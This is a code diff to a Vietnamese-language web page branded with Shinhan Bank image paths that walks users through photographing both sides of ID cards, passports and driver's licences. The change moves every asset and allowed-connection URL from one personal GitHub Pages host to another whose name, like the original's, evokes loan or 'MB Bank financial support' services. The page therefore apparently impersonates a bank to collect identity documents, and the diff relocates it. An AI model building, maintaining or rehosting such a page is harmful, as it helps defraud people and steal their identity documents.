@@ -7,10 +7,10 @@
         default-src 'self';
         script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://browser.sentry-cdn.com;
         style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://fonts.googleapis.com;
-        img-src 'self' https://via.placeholder.com https://vaytieudung.github.io https://www.shinhanfinancer.com https://upload.wikimedia.org data: blob:;
+        img-src 'self' https://via.placeholder.com https://hotrotaichinhmbbank-debug.github.io https://www.shinhanfinancer.com https://upload.wikimedia.org data: blob:;
         font-src 'self' data: blob: https://fonts.gstatic.com https://cdnjs.cloudflare.com https://cdnjs.cloudflare.com/ajax/libs/font-awesome/ https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/;
-        media-src 'self' data: blob: https://vaytieudung.github.io https://www.shinhanfinancer.com mediastream: blob:;
-        connect-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://vaytieudung.github.io https://o4506170000000000.ingest.sentry.io https://your-backend.com;
+        media-src 'self' data: blob: https://hotrotaichinhmbbank-debug.github.io https://www.shinhanfinancer.com mediastream: blob:;
+        connect-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://hotrotaichinhmbbank-debug.github.io https://o4506170000000000.ingest.sentry.io https://your-backend.com;
         worker-src 'self' blob:;
         frame-ancestors 'none';
     ">
@@ -697,15 +697,15 @@
                 </ul>
                 <div class="guide-examples">
                     <div class="guide-example incorrect">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/mo.png" alt="Ví dụ ảnh bị mờ">
+                        <img src="https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/mo.png" alt="Ví dụ ảnh bị mờ">
                         <p>Không chụp bị mờ</p>
                     </div>
                     <div class="guide-example incorrect">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/loasang.png" alt="Ví dụ ảnh bị lóa">
+                        <img src="https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/loasang.png" alt="Ví dụ ảnh bị lóa">
                         <p>Không chụp bị lóa</p>
                     </div>
                     <div class="guide-example incorrect">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc.png" alt="Ví dụ ảnh bị nhòe">
+                        <img src="https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/matgoc.png" alt="Ví dụ ảnh bị nhòe">
                         <p>Không chụp bị nhòe</p>
                     </div>
                 </div>
@@ -970,9 +970,9 @@
                 const steps = this.elements.guideSteps;
                 let frontSrc, backSrc, moUrl, loaUrl, matUrl, moText, loaText, matText, moAlt, loaAlt, matAlt;
                 
-                moUrl = 'https://vaytieudung.github.io/shinhanbank/lib/mo.png';
-                loaUrl = 'https://vaytieudung.github.io/shinhanbank/lib/loasang.png';
-                matUrl = 'https://vaytieudung.github.io/shinhanbank/lib/matgoc.png';
+                moUrl = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/mo.png';
+                loaUrl = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/loasang.png';
+                matUrl = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/matgoc.png';
                 moText = 'Không chụp bị mờ';
                 loaText = 'Không chụp bị lóa';
                 matText = 'Không chụp bị nhòe';
@@ -984,36 +984,36 @@
                     case 'cccd':
                         title.textContent = 'Hướng dẫn chụp ảnh CMT, CCCD';
                         steps.textContent = 'Bước 1: Chụp mặt trước Bước 2: Chụp mặt sau';
-                        frontSrc = 'https://vaytieudung.github.io/shinhanbank/lib/cmt_mt.png';
-                        backSrc = 'https://vaytieudung.github.io/shinhanbank/lib/cmt_ms.png';
+                        frontSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/cmt_mt.png';
+                        backSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/cmt_ms.png';
                         illustration.innerHTML = `<div class="guide-img-wrapper"><img src="${frontSrc}" alt="Mặt trước CMND/CCCD"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div><div class="guide-img-wrapper"><img src="${backSrc}" alt="Mặt sau CMND/CCCD"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div>`;
                         break;
                     case 'passport':
                         title.textContent = 'Hướng dẫn chụp ảnh Hộ chiếu';
                         steps.textContent = 'Bước 1: Chụp trang thông tin';
-                        frontSrc = 'https://vaytieudung.github.io/shinhanbank/lib/passport_mt.png'; // Placeholder for passport front
+                        frontSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/passport_mt.png'; // Placeholder for passport front
                         illustration.innerHTML = `<div class="guide-img-wrapper"><img src="${frontSrc}" alt="Trang thông tin Hộ chiếu"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div>`;
                         break;
                     case 'driver':
                         title.textContent = 'Hướng dẫn chụp ảnh Bằng lái xe';
                         steps.textContent = 'Bước 1: Chụp mặt trước Bước 2: Chụp mặt sau';
-                        frontSrc = 'https://vaytieudung.github.io/shinhanbank/lib/driver_mt.png'; // Placeholder for driver's license front
-                        backSrc = 'https://vaytieudung.github.io/shinhanbank/lib/driver_ms.png'; // Placeholder for driver's license back
+                        frontSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/driver_mt.png'; // Placeholder for driver's license front
+                        backSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/driver_ms.png'; // Placeholder for driver's license back
                         illustration.innerHTML = `<div class="guide-img-wrapper"><img src="${frontSrc}" alt="Mặt trước Bằng lái xe"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div><div class="guide-img-wrapper"><img src="${backSrc}" alt="Mặt sau Bằng lái xe"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div>`;
                         break;
                     case 'other':
                         title.textContent = 'Hướng dẫn chụp ảnh Giấy tờ khác';
                         steps.textContent = 'Bước 1: Chụp mặt trước (nếu có) Bước 2: Chụp mặt sau (nếu có)';
-                        frontSrc = 'https://vaytieudung.github.io/shinhanbank/lib/other_mt.png'; // Placeholder for other document front
-                        backSrc = 'https://vaytieudung.github.io/shinhanbank/lib/other_ms.png'; // Placeholder for other document back
+                        frontSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/other_mt.png'; // Placeholder for other document front
+                        backSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/other_ms.png'; // Placeholder for other document back
                         illustration.innerHTML = `<div class="guide-img-wrapper"><img src="${frontSrc}" alt="Mặt trước giấy tờ khác"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div><div class="guide-img-wrapper"><img src="${backSrc}" alt="Mặt sau giấy tờ khác"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div>`;
                         break;
                     default:
                         // Fallback to CCCD if type is unknown
                         title.textContent = 'Hướng dẫn chụp ảnh CMT, CCCD';
                         steps.textContent = 'Bước 1: Chụp mặt trước Bước 2: Chụp mặt sau';
-                        frontSrc = 'https://vaytieudung.github.io/shinhanbank/lib/cmt_mt.png';
-                        backSrc = 'https://vaytieudung.github.io/shinhanbank/lib/cmt_ms.png';
+                        frontSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/cmt_mt.png';
+                        backSrc = 'https://hotrotaichinhmbbank-debug.github.io/shinhanbank/lib/cmt_ms.png';
                         illustration.innerHTML = `<div class="guide-img-wrapper"><img src="${frontSrc}" alt="Mặt trước CMND/CCCD"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div><div class="guide-img-wrapper"><img src="${backSrc}" alt="Mặt sau CMND/CCCD"><div class="corner top-left"></div><div class="corner top-right"></div><div class="corner bottom-left"></div><div class="corner bottom-right"></div></div>`;
                         break;
                 }
@@ -1761,3 +1761,4 @@
     </script>
 </body>
 </html>
+
